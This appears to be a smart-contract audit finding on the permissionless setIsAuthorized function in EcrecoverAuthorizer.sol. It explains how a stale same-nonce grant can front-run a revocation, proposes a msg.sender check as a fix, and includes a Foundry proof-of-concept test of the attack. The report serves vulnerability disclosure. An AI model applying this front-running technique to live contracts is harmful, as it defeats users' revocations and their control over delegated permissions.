### Title
Permissionless `setIsAuthorized` allows front-running of revocation with a stale same-nonce grant — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` is fully permissionless: any caller may submit any valid signature. Because the nonce check only enforces sequential ordering and does not distinguish between grant and revocation messages, an attacker holding a previously-signed but unsubmitted grant `auth{nonce:N, isAuthorized:true}` can front-run the authorizer's revocation `auth{nonce:N, isAuthorized:false}`, consuming nonce N and causing the revocation to revert with `InvalidNonce`. The authorized party B therefore retains authorization after the authorizer explicitly intended to revoke it.

### Finding Description

**Code path and root cause**

`setIsAuthorized` in `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
    ...
    IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
}
``` [1](#0-0) 

There is no `msg.sender` restriction. The only ordering constraint is `authorization.nonce == nonce[authorization.authorizer]++`. The `isAuthorized` boolean is part of the EIP-712 struct hash, so `auth{nonce:N, isAuthorized:true}` and `auth{nonce:N, isAuthorized:false}` produce different digests and require different signatures — but **both are valid for nonce N**. Whichever is submitted first consumes nonce N; the other permanently fails with `InvalidNonce`.

**Attacker-controlled inputs**

The attacker supplies:
- `authorization`: the previously-signed grant struct `{authorizer:A, authorized:B, isAuthorized:true, nonce:N, deadline:T}` where `T > block.timestamp`
- `signature`: the authorizer's valid ECDSA signature over that struct

Both are fully attacker-controlled; no privileged access is required.

**Exploit flow**

1. Authorizer A signs `grant = auth{nonce:N, isAuthorized:true, deadline:T}` and hands it to B (or it is otherwise obtained by the attacker). It is never submitted; `nonce[A]` remains `N`.
2. A decides to revoke and signs `revoke = auth{nonce:N, isAuthorized:false, deadline:T'}`. A (or a relayer) broadcasts this transaction.
3. Attacker observes the mempool, extracts `revoke`, and front-runs with `grant` (nonce N, `isAuthorized:true`).
4. `grant` lands first: `nonce[A]` increments to `N+1`; `midnight.isAuthorized(A, B)` becomes `true`.
5. A's `revoke` transaction executes: `authorization.nonce (N) != nonce[A] (N+1)` → reverts `InvalidNonce`.

**Why existing checks fail**

- The deadline check (`block.timestamp <= authorization.deadline`) does not help: the grant's deadline is still in the future by precondition.
- The nonce check enforces ordering but does not prevent a competing same-nonce message from winning the race.
- There is no `msg.sender == authorization.authorizer` guard that would restrict who may submit a signature. [2](#0-1) [3](#0-2) 

### Impact Explanation
B retains `midnight.isAuthorized(A, B) == true` after A explicitly signed and broadcast a revocation. Any protocol action that requires A's authorization of B (e.g., B acting as a ratifier or delegate on A's positions) remains available to B indefinitely until A submits a fresh revocation with nonce `N+1` — which B can again front-run if B still holds further unsubmitted grants for higher nonces. The authorizer's ability to revoke is reliably defeated as long as the attacker holds a valid same-nonce grant.

### Likelihood Explanation
**Preconditions:**
1. A signed a grant with a future deadline and shared it with B (or a relayer) without submitting it — a normal off-chain delegation flow.
2. A later wants to revoke and signs a revocation with the same nonce (the only available nonce since the grant was never submitted).
3. B (the authorized party) is the natural attacker: they already hold the signed grant and have direct economic incentive to remain authorized.

This scenario arises naturally whenever a user signs a delegation off-chain and later changes their mind before the grant is submitted. It is repeatable: each time A tries to revoke via signature, B can front-run with the next unsubmitted grant.

### Recommendation
Add a `msg.sender == authorization.authorizer` check, or restrict submission to `msg.sender == authorization.authorizer || msg.sender == authorization.authorized` with a flag indicating intent. Alternatively, document that revocation **must** be performed by calling `midnight.setIsAuthorized` directly (which is not permissionless and cannot be front-run), and that off-chain grants should always carry short deadlines to bound the front-run window. The cleanest on-chain fix is:

```solidity
require(
    msg.sender == authorization.authorizer ||
    IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, msg.sender),
    Unauthorized()
);
```

placed before the nonce increment, so only the authorizer (or their already-established delegate) can submit a signature, eliminating the permissionless front-run vector.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, EIP712_DOMAIN_TYPEHASH, AUTHORIZATION_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunRevocationTest is BaseTest {
    function testFrontRunRevocation() public {
        // Setup: authorizer grants ecrecoverAuthorizer permission to act on their behalf
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Step 1: borrower (A) signs grant{nonce:0, isAuthorized:true} for lender (B)
        //         but does NOT submit it — nonce[borrower] remains 0
        Authorization memory grant = Authorization({
            authorizer: borrower,
            authorized: lender,
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        Signature memory grantSig = _sign(grant, borrower);

        // Step 2: borrower decides to revoke — signs revoke{nonce:0, isAuthorized:false}
        Authorization memory revoke = Authorization({
            authorizer: borrower,
            authorized: lender,
            isAuthorized: false,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        Signature memory revokeSig = _sign(revoke, borrower);

        // Step 3: attacker (lender/B) front-runs with the stale grant
        vm.prank(lender); // unprivileged — anyone can call
        ecrecoverAuthorizer.setIsAuthorized(grant, grantSig);

        // nonce is now 1; lender is authorized
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);
        assertTrue(midnight.isAuthorized(borrower, lender));

        // Step 4: borrower's revocation fails — nonce mismatch
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(revoke, revokeSig);

        // INVARIANT VIOLATED: lender remains authorized after borrower intended to revoke
        assertTrue(midnight.isAuthorized(borrower, lender));
    }

    function _sign(Authorization memory auth, address signer)
        internal view returns (Signature memory)
    {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[signer], digest);
        return Signature({v: v, r: r, s: s});
    }
}
```

**Expected assertions:**
- `midnight.isAuthorized(borrower, lender) == true` after the front-run (line asserting `assertTrue`)
- `ecrecoverAuthorizer.setIsAuthorized(revoke, revokeSig)` reverts with `InvalidNonce`
- Final `assertTrue(midnight.isAuthorized(borrower, lender))` confirms the invariant violation: authorization persists despite the authorizer's explicit revocation attempt
